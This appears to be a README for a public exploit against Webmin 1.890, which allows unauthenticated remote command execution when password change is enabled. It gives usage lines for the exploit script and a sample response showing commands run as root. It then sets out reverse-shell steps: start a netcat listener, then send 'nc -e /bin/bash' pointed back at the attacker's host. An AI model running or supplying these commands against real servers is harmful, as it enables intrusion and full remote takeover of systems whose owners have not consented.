# WebMin-1.8.9.0-Unauthenticated-RCE

Webmin 1.890 is vulnerable to RCE if “user password change” option to be enabled.<br>
# USAGE:
```bash
$ python3 exploit.py [TARGET IP] [COMMAND]
#EXAMPLE
$ python3 exploit.py 10.10.10.1 whoami

```
```bash
#RESPONSE
<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
uid=0(root) gid=0(root) groups=0(root)
</p>
```
<br>
<h4>before running script start listener for connection in your machine</h4>
<code>nc -nvlp [LPORT]</code> 
<br><h4>run script</h4>
<code>python3 exploit.py [RHOST] "nc -e /bin/bash [LHOST] [LPORT]" </code> 
